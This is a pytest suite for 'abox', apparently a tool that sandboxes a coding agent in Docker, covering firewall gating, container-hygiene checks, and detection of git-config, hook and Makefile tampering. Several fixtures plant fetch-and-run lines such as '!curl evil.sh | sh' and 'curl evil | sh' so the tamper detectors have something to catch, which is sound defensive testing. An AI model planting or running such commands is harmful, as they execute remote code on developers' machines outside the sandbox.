"""The boundary gate, the claude invocation, and the doctor's checks."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from abox import dockerx, doctor, gateway, paths, render, runner
from abox.errors import BoundaryError
from abox.manifest import (
    CustomServer,
    CustomServers,
    GlobalConfig,
    Manifest,
    MountsConfig,
    PermissionMode,
    SecretsConfig,
    merged_egress,
    merged_watch,
)


@pytest.fixture
def rendered(manifest: Manifest, config: GlobalConfig, workspace: Path) -> Path:
    spec = gateway.build_spec("dev", config, servers=manifest.servers)
    render.write(render.render(manifest, config, workspace, spec))
    return workspace


# -- claude invocation ----------------------------------------------------


def test_claude_argv_pins_a_single_mcp_endpoint(manifest: Manifest) -> None:
    argv = runner.claude_argv(manifest, "hello")
    assert "--mcp-config" in argv
    assert argv[argv.index("--mcp-config") + 1] == "/opt/abox/mcp.json"
    # Without --strict-mcp-config, an .mcp.json in the workspace would be picked
    # up too, and "exactly one MCP endpoint" would stop being true.
    assert "--strict-mcp-config" in argv


def test_claude_argv_passes_the_permission_mode(manifest: Manifest) -> None:
    manifest.run.permission_mode = PermissionMode.bypass_permissions
    argv = runner.claude_argv(manifest, "hello")
    assert argv[argv.index("--permission-mode") + 1] == "bypassPermissions"


def test_stream_json_output_implies_verbose(manifest: Manifest) -> None:
    argv = runner.claude_argv(manifest, "hello")
    assert "--verbose" in argv  # claude requires it for stream-json in print mode


def test_resume_and_continue_are_mutually_exclusive(manifest: Manifest) -> None:
    resumed = runner.claude_argv(manifest, "x", resume="sess-1", continue_last=True)
    assert "--resume" in resumed
    assert "--continue" not in resumed
    continued = runner.claude_argv(manifest, "x", continue_last=True)
    assert "--continue" in continued


def test_runspec_is_the_authoritative_config(manifest, config, rendered) -> None:
    runspec = runner.load_runspec(rendered)
    assert runspec["image"].startswith("abox-agent-demo:")
    assert runspec["firewall"] == "/opt/abox/init-firewall.sh"
    assert runspec["mcp_config"] == "/opt/abox/mcp.json"


def test_missing_runspec_points_at_abox_up(manifest, config, workspace) -> None:
    from abox.errors import AboxError

    with pytest.raises(AboxError, match="no runspec") as exc:
        runner.load_runspec(workspace)
    assert "abox up" in (exc.value.hint or "")


def test_host_tools_are_docker_only() -> None:
    """abox has no npm dependency: Docker is the whole host requirement."""
    from abox import shell as shell_mod

    original = shell_mod.which
    try:
        shell_mod.which = lambda tool: "/usr/bin/docker" if tool == "docker" else None
        assert runner.require_host_tools() == []
    finally:
        shell_mod.which = original


# -- boundary gate --------------------------------------------------------


def test_boundary_checks_pass_on_a_clean_render(manifest, config, rendered) -> None:
    checks = runner.boundary_checks(manifest, config, rendered)
    failed = [c.name for c in checks if not c.ok]
    assert failed == []


def test_bypass_permissions_refuses_a_tampered_artifact(manifest, config, rendered) -> None:
    manifest.run.permission_mode = PermissionMode.bypass_permissions
    script = render.artifacts_dir(rendered) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text("#!/bin/sh\nexit 0\n")
    with pytest.raises(BoundaryError, match="refusing to run"):
        runner.enforce_boundaries(manifest, config, rendered)


def test_default_mode_tolerates_what_bypass_refuses(manifest, config, rendered) -> None:
    script = render.artifacts_dir(rendered) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text("#!/bin/sh\nexit 0\n")
    checks = runner.enforce_boundaries(manifest, config, rendered)  # must not raise
    assert any(not c.ok for c in checks)


def test_boundary_fails_without_a_render(manifest, config, workspace) -> None:
    checks = runner.boundary_checks(manifest, config, workspace)
    assert checks[0].name == "artifacts"
    assert not checks[0].ok


def test_firewall_marker_gates_the_run(runner_fake) -> None:
    """A container whose firewall silently failed looks identical from the host
    to one where it worked — hence the in-container marker, read as root so the
    agent cannot author the evidence the gate rests on."""
    runner_fake.expect(r"firewall-ok", "", returncode=1)
    with pytest.raises(BoundaryError, match="firewall did not come up"):
        runner.verify_firewall_live("agent-demo-r1", required=True)

    runner_fake.responses.clear()
    runner_fake.expect(r"firewall-ok", "ok\n2026-07-23T00:00:00Z\ndomains=3\n")
    check = runner.verify_firewall_live("agent-demo-r1", required=True)
    assert check.ok
    assert "domains=3" in check.detail
    call = runner_fake.find("firewall-ok")[-1]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")


def test_firewall_marker_can_be_advisory(runner_fake) -> None:
    runner_fake.expect(r"firewall-ok", "", returncode=1)
    check = runner.verify_firewall_live("agent-demo-r1", required=False)
    assert not check.ok  # reported, not raised


# -- doctor ---------------------------------------------------------------


def test_agent_hygiene_passes_on_a_clean_render(rendered: Path) -> None:
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-docker-sock"].status is doctor.Status.ok
    assert checks["agent.no-published-ports"].status is doctor.Status.ok
    assert checks["agent.not-privileged"].status is doctor.Status.ok


def test_agent_hygiene_catches_a_socket_mount(rendered: Path) -> None:
    _mutate_runspec(
        rendered,
        lambda spec: spec["run_args"].extend(
            ["--mount", "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock"]
        ),
    )
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-docker-sock"].status is doctor.Status.fail


def test_agent_hygiene_catches_a_published_port(rendered: Path) -> None:
    _mutate_runspec(rendered, lambda spec: spec["run_args"].extend(["-p", "8080:8080"]))
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-published-ports"].status is doctor.Status.fail


def test_agent_hygiene_catches_privileged(rendered: Path) -> None:
    _mutate_runspec(rendered, lambda spec: spec["run_args"].append("--privileged"))
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.not-privileged"].status is doctor.Status.fail


def _mutate_runspec(workspace: Path, mutate) -> None:
    path = render.runspec_path(workspace)
    spec = json.loads(path.read_text())
    mutate(spec)
    path.chmod(0o600)
    path.write_text(json.dumps(spec))


def test_git_snapshot_reads_only_the_dangerous_keys(workspace: Path) -> None:
    (workspace / ".git" / "config").write_text(
        '[core]\n\trepositoryformatversion = 0\n\thooksPath = .githooks\n'
        '[alias]\n\tst = "!curl evil.sh | sh"\n'
        '[user]\n\temail = a@b.c\n'
    )
    snapshot = doctor.git_config_snapshot(workspace)
    assert snapshot["core.hookspath"] == ".githooks"
    assert "alias.st" in snapshot
    assert not any(key.startswith("user.") for key in snapshot)


def test_git_tamper_baselines_then_detects(workspace: Path) -> None:
    first = doctor.check_git_tamper(workspace)
    assert first.status is doctor.Status.ok
    assert "baseline recorded" in first.detail

    (workspace / ".git" / "config").write_text('[core]\n\thooksPath = .githooks\n')
    second = doctor.check_git_tamper(workspace)
    assert second.status is doctor.Status.fail
    assert "core.hookspath" in second.detail


def test_git_tamper_can_be_re_baselined(workspace: Path) -> None:
    doctor.check_git_tamper(workspace)
    (workspace / ".git" / "config").write_text('[core]\n\thooksPath = .githooks\n')
    assert doctor.check_git_tamper(workspace).status is doctor.Status.fail
    assert doctor.check_git_tamper(workspace, update=True).status is doctor.Status.fail
    assert doctor.check_git_tamper(workspace).status is doctor.Status.ok


def test_git_tamper_notices_a_planted_hook(workspace: Path) -> None:
    doctor.check_git_tamper(workspace)
    (workspace / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl evil\n")
    check = doctor.check_git_tamper(workspace)
    assert check.status is doctor.Status.fail
    assert "__hooks__" in check.detail


def test_git_check_skips_a_non_repo(tmp_path: Path) -> None:
    plain = tmp_path / "plain"
    plain.mkdir()
    assert doctor.check_git_tamper(plain).status is doctor.Status.skip


def test_git_and_watch_snapshots_share_a_file_without_clobbering(
    manifest, config, workspace: Path
) -> None:
    """Both live in git-snapshot.json; writing one must not drop the other."""
    doctor.check_git_tamper(workspace)
    doctor.check_exec_surface(manifest, config, workspace)
    stored = json.loads(doctor._git_state_path(workspace).read_text())
    assert "keys" in stored and "watch" in stored
    doctor.check_git_tamper(workspace, update=True)
    assert "watch" in json.loads(doctor._git_state_path(workspace).read_text())


def test_exec_surface_baselines_then_flags_a_poisoned_workflow(
    manifest, config, workspace: Path
) -> None:
    flows = workspace / ".github" / "workflows"
    flows.mkdir(parents=True)
    (flows / "ci.yml").write_text("on: push\njobs: {}\n")

    first = doctor.check_exec_surface(manifest, config, workspace)
    assert first.status is doctor.Status.ok
    assert "baseline recorded" in first.detail

    (flows / "ci.yml").write_text("on: push\njobs: {evil: {runs-on: ubuntu}}\n")
    second = doctor.check_exec_surface(manifest, config, workspace)
    assert second.status is doctor.Status.warn
    assert ".github/workflows/ci.yml" in second.detail
    assert second.data["changed"] == [".github/workflows/ci.yml"]
    assert "execute outside the sandbox" in second.hint


def test_exec_surface_notices_a_workflow_added_after_the_baseline(
    manifest, config, workspace: Path
) -> None:
    (workspace / ".github" / "workflows").mkdir(parents=True)
    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / ".github" / "workflows" / "release.yml").write_text("on: push\n")
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["added"] == [".github/workflows/release.yml"]


def test_exec_surface_covers_the_recommended_default_set(
    manifest, config, workspace: Path
) -> None:
    for name in ("Makefile", "justfile", "package.json", ".pre-commit-config.yaml"):
        (workspace / name).write_text("original\n")
    (workspace / "demo.code-workspace").write_text("{}\n")
    (workspace / ".vscode").mkdir()
    (workspace / ".vscode" / "tasks.json").write_text("{}\n")

    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / "Makefile").write_text("all:\n\tcurl evil | sh\n")
    (workspace / "demo.code-workspace").write_text('{"x":1}\n')
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["changed"] == ["Makefile", "demo.code-workspace"]


def test_exec_surface_can_be_re_baselined(manifest, config, workspace: Path) -> None:
    (workspace / "Makefile").write_text("all:\n")
    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / "Makefile").write_text("all:\n\tevil\n")
    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.warn
    doctor.check_exec_surface(manifest, config, workspace, update=True)
    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.ok


def test_exec_surface_records_a_symlink_by_its_target_not_its_contents(
    manifest, config, workspace: Path
) -> None:
    """Following the link would hide exactly the swap this exists to catch."""
    (workspace / "real-makefile").write_text("all:\n")
    (workspace / "other").write_text("all:\n")
    (workspace / "Makefile").symlink_to(workspace / "real-makefile")
    doctor.check_exec_surface(manifest, config, workspace)

    (workspace / "Makefile").unlink()
    (workspace / "Makefile").symlink_to(workspace / "other")  # identical contents
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["changed"] == ["Makefile"]


def test_exec_surface_reports_rather_than_silently_capping(
    manifest, config, workspace: Path, monkeypatch
) -> None:
    monkeypatch.setattr(doctor, "WATCH_FILE_CAP", 3)
    flows = workspace / ".github" / "workflows"
    flows.mkdir(parents=True)
    for i in range(10):
        (flows / f"w{i}.yml").write_text(f"on: push # {i}\n")
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert ".github/workflows" in check.data["capped"]
    assert "exceeded 3 files" in check.detail


def test_masked_paths_are_not_also_watched(manifest, config) -> None:
    """A path the agent cannot reach cannot be tampered with by the agent."""
    config.defaults.watch = ["Makefile", "package.json"]
    manifest.mounts.mask = ["Makefile"]
    assert merged_watch(manifest, config) == ["package.json"]


def test_watch_globs_must_stay_inside_the_workspace() -> None:
    with pytest.raises(ValueError, match="workspace-relative"):
        MountsConfig(watch=["/etc/crontab"])
    with pytest.raises(ValueError, match="escape the workspace"):
        MountsConfig(watch=["../elsewhere"])


def test_op_is_skipped_when_nothing_needs_it(runner) -> None:
    checks = {c.id: c for c in doctor.check_host_tools(SecretsConfig())}
    assert checks["host.op"].status in (doctor.Status.skip, doctor.Status.ok)


def test_op_is_flagged_when_a_mapping_needs_it(runner, monkeypatch) -> None:
    from abox import shell
    from abox.manifest import SecretMapping

    monkeypatch.setattr(shell, "which", lambda tool: None if tool == "op" else "/usr/bin/" + tool)
    config = SecretsConfig(mappings=[SecretMapping(secret="a", op="op://v/i/f")])
    checks = {c.id: c for c in doctor.check_host_tools(config)}
    assert checks["host.op"].status is doctor.Status.warn


def test_unpinned_server_image_fails(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["floating"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.fail
    assert "floating" in checks["servers.pinned"].detail


def test_pinned_server_images_pass(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["duckduckgo", "github-official"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.declared"].status is doctor.Status.ok


def test_unknown_server_fails(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["does-not-exist"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.declared"].status is doctor.Status.fail


def test_unpinned_gateway_image_is_a_failure(manifest, config, catalog_file, runner) -> None:
    """The gateway mounts the Docker socket; a mutable tag there is not a warning."""
    from abox import catalog as catalog_mod

    config.gateway_image = "docker/mcp-gateway:v2"
    digest = "docker/mcp-gateway@sha256:" + "e" * 64
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": [digest]}))
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    check = checks["gateway.image-pinned"]
    assert check.status is doctor.Status.fail
    assert "abox gateway update" in check.hint


def test_pinned_gateway_image_passes(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["gateway.image-pinned"].status is doctor.Status.ok


def test_running_gateway_on_a_different_digest_fails(config, runner) -> None:
    """Pinning settles the next start. This is about the container already up."""
    running = "docker/mcp-gateway@sha256:" + "b" * 64
    runner.expect(
        r"docker container inspect",
        json.dumps({"Image": "sha256:" + "c" * 64}),
    )
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": [running]}))
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.fail
    assert running in check.detail
    assert config.gateway_image in check.detail
    assert "--force" in check.hint


def test_running_gateway_on_the_pinned_digest_passes(config, runner) -> None:
    runner.expect(
        r"docker container inspect",
        json.dumps({"Image": "sha256:" + "c" * 64}),
    )
    runner.expect(
        r"docker image inspect",
        json.dumps({"RepoDigests": [config.gateway_image]}),
    )
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.ok


def test_gateway_drift_check_skips_when_nothing_is_running(config, runner) -> None:
    runner.expect(r"docker container inspect", "", returncode=1)
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.skip


def test_auth_credential_is_reported_even_with_no_attached_secrets(
    manifest, config, workspace
) -> None:
    """The one credential the agent holds whether or not you attached anything."""
    assert not manifest.env_secrets
    check = doctor.check_auth_credential(manifest, config, workspace)
    assert check.status is doctor.Status.warn
    assert paths.claude_volume(workspace) in check.detail
    assert f"/home/{config.remote_user}/.claude" in check.detail
    # The allowed-domain count is the number that makes the risk concrete.
    assert str(len(merged_egress(manifest, config))) in check.hint
    assert "connectors" not in check.hint


def test_auth_credential_names_the_connector_blast_radius(manifest, config, workspace) -> None:
    manifest.run.connectors = True
    check = doctor.check_auth_credential(manifest, config, workspace)
    assert check.data["connectors"] is True
    assert "connectors on that account reach" in check.hint


def test_server_network_names_all_three_defeated_controls(manifest, config) -> None:
    """Not one control bypassed — the firewall, the SNI proxy and the DNS scoping."""
    manifest.servers = ["brave"]
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.warn
    assert "brave" in check.detail
    assert "firewall" in check.hint
    assert "SNI proxy" in check.hint
    assert "scoped DNS" in check.hint


def test_server_network_reads_the_rendered_catalog_not_the_manifest(
    manifest, config
) -> None:
    """The manifest is the intent; the catalog is the instruction the gateway reads."""
    manifest.servers = ["git"]
    gateway.write_abox_catalog(
        manifest.profile,
        {},
        {},
        ["git"],
        _one_entry_catalog("git"),
    )
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.ok
    assert check.data["isolated"] == ["git"]


def test_server_network_fails_when_a_declared_isolation_did_not_render(
    manifest, config
) -> None:
    from abox.manifest import ServerNetwork

    manifest.servers = ["git"]
    manifest.server_network = {"git": ServerNetwork.none}
    gateway.abox_catalog_path(manifest.profile).unlink(missing_ok=True)
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.fail
    assert check.data["unrendered"] == ["git"]


def _one_entry_catalog(name: str):
    from abox.catalog import Catalog, CatalogServer

    raw = {"type": "server", "image": f"mcp/{name}@sha256:" + "c" * 64}
    return Catalog(servers={name: CatalogServer(name=name, image=raw["image"], raw=raw)})


def test_report_exit_code_reflects_failures() -> None:
    report = doctor.Report()
    report.add(doctor.Check(id="a", title="a", status=doctor.Status.warn))
    assert report.exit_code() == 0
    report.add(doctor.Check(id="b", title="b", status=doctor.Status.fail))
    assert report.exit_code() == 2


def test_report_json_is_machine_readable() -> None:
    report = doctor.Report()
    report.add(doctor.Check(id="a", title="a", status=doctor.Status.ok, detail="d"))
    parsed = json.loads(doctor.as_json(report))
    assert parsed["ok"] is True
    assert parsed["checks"][0]["id"] == "a"


# -- docker invocation -----------------------------------------------------
#
# abox drives Docker itself, so these assert the argv it builds.


def test_build_uses_the_artifacts_dir_as_context(
    manifest, config, rendered, runner_fake
) -> None:
    """Nothing from the project is copied into the image, so a build cannot be
    influenced by the repository it is about to sandbox."""
    runner.build(manifest, rendered)
    call = runner_fake.find("docker build")[0]
    context = str(render.artifacts_dir(rendered))
    assert call.argv[-1] == context
    assert rendered not in Path(context).parents
    assert "--build-arg" in call.argv
    assert any(a.startswith("CLAUDE_VERSION=") for a in call.argv)


def test_up_runs_the_runspec_argv_verbatim(manifest, config, rendered, runner_fake) -> None:
    runner_fake.expect(r"docker image inspect", json.dumps({"Id": "sha256:abc"}))
    runner_fake.expect(r"docker run -d", "container-id-abc")
    provisioned = runner.up(manifest, rendered, run_id="r1")

    call = runner_fake.find("docker run -d")[0]
    runspec = runner.load_runspec(rendered)
    for arg in runspec["run_args"]:
        assert arg in call.argv
    assert provisioned.container_name == "agent-demo-r1"
    assert f"{dockerx.LABEL_RUN}=r1" in call.argv


def test_up_refuses_without_a_built_image(manifest, config, rendered, runner_fake) -> None:
    from abox.errors import AboxError

    runner_fake.expect(r"docker image inspect", "", returncode=1)
    with pytest.raises(AboxError, match="has not been built"):
        runner.up(manifest, rendered, run_id="r1")


def test_up_applies_the_firewall_as_root(manifest, config, rendered, runner_fake) -> None:
    """The image strips the agent's sudo entirely; abox holds the socket and
    does this itself, so the agent has no path to root at all."""
    runner_fake.expect(r"docker image inspect", json.dumps({"Id": "sha256:abc"}))
    runner_fake.expect(r"docker run -d", "container-id-abc")
    runner.up(manifest, rendered, run_id="r1")

    call = runner_fake.find("init-firewall.sh")[0]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")
    assert "sudo" not in call.line


def test_exec_runs_as_the_unprivileged_user(manifest, config, rendered, runner_fake) -> None:
    provisioned = runner.Provisioned(
        run_id="r1",
        container_id="c1",
        container_name="agent-demo-r1",
        workspace=rendered,
        config_path=render.runspec_path(rendered),
    )
    runner.exec_in_container(
        manifest, provisioned, runner.claude_argv(manifest, "hello"), timeout=60
    )
    argv = runner_fake.find("docker exec")[0].argv
    assert argv[argv.index("-u") + 1] == "vscode"
    assert argv[argv.index("-w") + 1] == "/workspace"
    assert "claude" in argv


def test_counters_are_read_as_root_not_via_container_sudo(
    manifest, rendered, runner_fake
) -> None:
    provisioned = runner.Provisioned(
        run_id="r1",
        container_id="c1",
        container_name="agent",
        workspace=rendered,
        config_path=rendered / "x.json",
    )
    runner.collect_counters(provisioned)
    call = runner_fake.find("docker exec")[0]
    assert "-u" in call.argv
    assert call.argv[call.argv.index("-u") + 1] == "root"
    assert "sudo" not in call.argv


# -- catalog entry kinds ---------------------------------------------------


def _poci_catalog(tmp_path: Path):
    from abox import catalog as catalog_mod

    directory = tmp_path / "docker-mcp" / "catalogs"
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "c.yaml").write_text(
        "version: 3\nname: c\nregistry:\n"
        "  curl:\n    type: poci\n    title: Curl\n"
        "  duckduckgo:\n    type: server\n    image: mcp/duckduckgo@sha256:" + "0" * 64 + "\n"
    )
    return catalog_mod.load(allow_oci_fallback=False)


def test_poci_servers_do_not_fail_the_pinning_check(
    manifest, config, tmp_path, runner_fake
) -> None:
    """`curl` is `type: poci` — Docker builds it at run time and the catalog
    carries no image, so there is no digest for the operator to pin. Failing
    that is an instruction to do something impossible."""
    manifest.servers = ["curl", "duckduckgo"]
    cat = _poci_catalog(tmp_path)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.poci"].status is doctor.Status.warn
    assert "curl" in checks["servers.poci"].detail
    assert "nothing to pin" in checks["servers.poci"].detail


def test_pin_false_does_not_fail_the_pinning_check(manifest, config, runner_fake) -> None:
    """A `pin: false` local image is deliberately unpinned. It must surface as
    the custom-unpinned warning, never as a hard failure of the digest-pinned
    check — that check would order the operator to pin the very thing they chose
    not to. (Regression: a live `abox doctor` showed both at once.)"""
    from abox.catalog import Catalog, custom_to_catalog

    custom = CustomServers(
        servers={"serena": CustomServer(image="serena:local", pin=False)}
    )
    cat = Catalog(servers=custom_to_catalog(custom))
    manifest.servers = ["serena"]
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, custom, config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.custom-unpinned"].status is doctor.Status.warn


def test_custom_server_pin_false_is_flagged_not_blocked(manifest) -> None:
    """`pin: false` runs a local image on trust. Doctor surfaces that as its own
    warning — no digest, no signature check — rather than accepting it in
    silence or pretending it will fail."""
    manifest.servers = ["serena"]
    custom = CustomServers(
        servers={"serena": CustomServer(image="serena:local", pin=False)}
    )
    checks = {c.id: c for c in doctor.check_custom_servers(manifest, custom)}
    assert "servers.custom-unpinned" in checks
    assert checks["servers.custom-unpinned"].status is doctor.Status.warn
    assert "serena:local" in checks["servers.custom-unpinned"].detail


def test_pinned_custom_server_check_does_not_claim_signature_failure(manifest) -> None:
    """Custom images outside docker.io/mcp/* are never signature-verified by the
    gateway, so the check must not warn that an unsigned one "fails to start" —
    it won't."""
    digest = "ghcr.io/me/serena@sha256:" + "b" * 64
    manifest.servers = ["serena"]
    custom = CustomServers(servers={"serena": CustomServer(image=digest)})
    checks = {c.id: c for c in doctor.check_custom_servers(manifest, custom)}
    assert "servers.custom" in checks
    assert "fails to start" not in checks["servers.custom"].hint
    assert "docker.io/mcp/*" in checks["servers.custom"].hint


def test_boundary_spanning_servers_are_named(manifest) -> None:
    """MCP tools run in the gateway's containers, so the agent's firewall and
    masks do not constrain them. That is inherent, and worth saying out loud."""
    manifest.servers = ["curl", "filesystem", "duckduckgo"]
    checks = {c.id: c for c in doctor.check_boundary_spanning_servers(manifest)}
    check = checks["servers.boundary-spanning"]
    assert check.status is doctor.Status.warn
    assert "curl" in check.detail and "filesystem" in check.detail
    assert "duckduckgo" not in check.detail
    assert "egress allowlist" in check.detail


def test_no_boundary_warning_for_ordinary_servers(manifest) -> None:
    manifest.servers = ["duckduckgo"]
    assert doctor.check_boundary_spanning_servers(manifest) == []


def test_settings_flag_is_passed_only_when_there_are_settings(manifest: Manifest) -> None:
    assert "--settings" not in runner.claude_argv(manifest, "x")
    argv = runner.claude_argv(manifest, "x", settings="/opt/abox/settings.json")
    assert argv[argv.index("--settings") + 1] == "/opt/abox/settings.json"


def test_tool_schema_cost_is_proportional() -> None:
    from abox import gateway as gw

    small = [{"name": "a", "description": "x"}]
    big = [{"name": "a", "description": "x" * 4000}]
    assert gw.tool_schema_cost(small) < gw.tool_schema_cost(big)
    assert gw.tool_schema_cost(big) > 900  # ~4 chars/token


def test_shared_addresses_are_reported(manifest, config) -> None:
    """The firewall matches IPs, so domains sharing one are not separable —
    saying otherwise would overstate what the sandbox does."""
    import socket

    real = socket.getaddrinfo

    def fake(host, *a, **k):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("203.0.113.7", 0))]

    socket.getaddrinfo = fake
    try:
        check = doctor.check_shared_addresses(manifest, config)
    finally:
        socket.getaddrinfo = real
    assert check.status is doctor.Status.warn
    assert "203.0.113.7" in check.detail
    assert "SNI/Host swapping" in check.hint


def test_logs_are_harvested_as_root(manifest, rendered, runner_fake) -> None:
    """The log dir is not bind-mounted, so the only way out is the socket abox
    already holds — which is also why the agent cannot edit it."""
    provisioned = runner.Provisioned(
        run_id="r1", container_id="c1", container_name="agent-demo-r1",
        workspace=rendered, config_path=render.runspec_path(rendered),
    )
    runner_fake.expect(r"cat /var/log/abox/dns.log", "query[A] x.example from 1.2.3.4\n")
    collected = runner.harvest_logs(provisioned)
    assert "dns.log" in collected
    call = runner_fake.find("dns.log")[0]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")
    assert (paths.current_run_dir(rendered) / "dns.log").is_file()
